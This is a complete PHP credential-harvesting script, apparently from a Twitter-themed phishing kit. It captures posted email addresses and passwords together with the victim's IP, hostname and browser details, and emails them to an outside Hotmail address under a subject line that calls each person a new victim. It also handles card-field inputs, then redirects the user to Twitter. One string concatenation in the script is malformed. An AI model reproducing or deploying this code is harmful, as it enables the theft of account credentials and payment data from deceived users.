<?php
$ip = getenv("REMOTE_ADDR");
$message .= "تويتر \n";
$message .= "----  معلومات الحساب ----\n";
$message .= "Email Adresse       : ".$_POST['email']."\n";
$message .= "Password          : ".$_POST['pass']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "--- محمد المعبدي ---\n";
$cc = $_POST['ccn'];
$subject = "ضحية جديدة ياقلبي".$_POST['exm'].".".$_POST['exy'];
$send = "zbx@hotmail.it";
$headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
mail($send,$subject,$message,$headers);

header("Location:https://twitter.com/groupafnanalmon7rfah");?>